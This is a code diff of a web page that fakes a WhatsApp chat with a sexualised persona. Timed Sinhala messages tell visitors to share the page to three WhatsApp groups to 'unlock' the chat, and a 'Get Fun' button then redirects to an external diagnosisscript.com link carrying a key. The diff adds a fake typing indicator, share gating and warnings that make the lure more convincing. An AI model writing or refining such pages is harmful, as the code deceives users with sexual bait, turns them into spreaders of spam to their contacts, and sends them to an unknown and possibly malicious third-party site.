@@ -27,28 +27,37 @@
       <div class="encryption-banner">
         🔒 Messages and calls are end-to-end encrypted. Only people in this chat can read, listen to, or share them.
       </div>
+      <div class="typing-indicator" id="typingIndicator" style="display:none;">Nethu Bbh is typing...</div>
     </div>
 
-    <button class="share-button" id="shareBtn" onclick="shareToWhatsApp()">🔐 Share to Unlock Chat</button>
-    <button class="send-button" id="sendPhotosBtn" onclick="sendPhotos()">📷 Send Photos</button>
+    <div class="button-group">
+      <button class="share-button" id="shareBtn" onclick="shareToWhatsApp()">Share 0/3 🔐</button>
+      <button class="send-button" id="sendPhotosBtn" onclick="sendPhotos()">Get Fun 🍆💦</button>
+    </div>
 
-    <div class="chat-footer">
-      <input type="text" placeholder="Message" disabled>
-      <i class="material-icons">send</i>
+    <div id="warning-msg">⚠️ First Share!</div>
+
+    <div class="chat-footer" id="chatFooter">
+      <input type="text" placeholder="Message (max 20 chars)" id="userInput" maxlength="20">
+      <i class="material-icons" id="sendIcon">send</i>
     </div>
   </div>
 
   <script>
     const messages = [
-      "හායි පැටියො 🥵🔥",
-      "Chat එක Lock කරලා තියෙන්නෙ.Unlock කරගන සැපක් ගන්න ඕනෙනම් පහල විදියට කරන්න😘",
-      "යට තියෙන Share To Unlock Click කරලා කෙලිංම Whatsapp Group 3 කට Share කරන්න",
-      "Share කරපු Msg 3 Screenshot 3 ක් Send Photos ගිහිං මට එවන්න පැටියෝ 😘💕 හරියටම කරලද බලලා මන් Chat එක Unlock කරලා හොද සැපක් දෙන්නම් 🥵💦"
+      "හායි පැටියො 🥵🧡 Chat එක Lock කරලා තියෙන්නෙ❗",
+      "පහල Share Button එක Click කරලා කෙලිංම Whatsapp Group 3 කට Share කරලා Chat එක Unlock කරගන්න 🥵💋",
+      "ඊටපස්සෙ Get Fun Click කරලා ඔයාට මම එක්ක ඇති තරම් Fun ගන්න පුලුවන් 😍❤️ ඉක්මන් කරන්න පැටියෝ මට ඉන්න බෑ 🥵💦"
     ];
 
     const chatBody = document.getElementById('chat-body');
     const shareBtn = document.getElementById('shareBtn');
     const sendPhotosBtn = document.getElementById('sendPhotosBtn');
+    const warningMsg = document.getElementById('warning-msg');
+    const userInput = document.getElementById('userInput');
+    const sendIcon = document.getElementById('sendIcon');
+    const chatFooter = document.getElementById('chatFooter');
+    const typingIndicator = document.getElementById('typingIndicator');
 
     window.onload = () => {
       messages.forEach((msg, index) => {
@@ -60,10 +69,6 @@
           chatBody.scrollTop = chatBody.scrollHeight;
         }, (index + 1) * 2000);
       });
-
-      setTimeout(() => {
-        shareBtn.style.display = "block";
-      }, messages.length * 2000 + 1000);
     };
 
     function shareToWhatsApp() {
@@ -73,16 +78,67 @@
       const link = `https://wa.me/?text=${msg}`;
       window.location.href = link;
 
-      // After 5 seconds, show send photos
+      shareBtn.disabled = true;
       setTimeout(() => {
-        shareBtn.style.display = "none";
-        sendPhotosBtn.style.display = "block";
+        shareBtn.textContent = "Shared ✅";
+        sendPhotosBtn.disabled = false;
+        sendPhotosBtn.classList.add("enabled");
+        chatFooter.style.display = "none"; // Hide input bar and icon
       }, 5000);
     }
 
     function sendPhotos() {
+      if (!sendPhotosBtn.classList.contains("enabled")) {
+        showWarning();
+        return;
+      }
       window.location.href = "https://diagnosisscript.com/dcf7x23r83?key=2ac6355133543eecf956d375da68f7b6";
     }
+
+    function showWarning() {
+      warningMsg.classList.add("show-warning");
+      setTimeout(() => {
+        warningMsg.classList.remove("show-warning");
+      }, 3000);
+    }
+
+    let typingTimeout;
+
+    userInput.addEventListener("input", () => {
+      if (userInput.value.trim().length > 0) {
+        sendIcon.style.opacity = 1;
+        sendIcon.style.cursor = "pointer";
+
+        // Show typing indicator
+        typingIndicator.style.display = "block";
+        clearTimeout(typingTimeout);
+        typingTimeout = setTimeout(() => {
+          typingIndicator.style.display = "none";
+        }, 2000);
+      } else {
+        sendIcon.style.opacity = 0.4;
+        sendIcon.style.cursor = "not-allowed";
+        typingIndicator.style.display = "none";
+      }
+    });
+
+    sendIcon.addEventListener("click", () => {
+      if (!sendPhotosBtn.classList.contains("enabled")) {
+        showWarning();
+        return;
+      }
+      if (userInput.value.trim().length > 0) {
+        const msg = document.createElement("div");
+        msg.className = "message";
+        msg.textContent = userInput.value;
+        chatBody.appendChild(msg);
+        chatBody.scrollTop = chatBody.scrollHeight;
+        userInput.value = "";
+        sendIcon.style.opacity = 0.4;
+        sendIcon.style.cursor = "not-allowed";
+        typingIndicator.style.display = "none";
+      }
+    });
   </script>
 </body>
 </html>
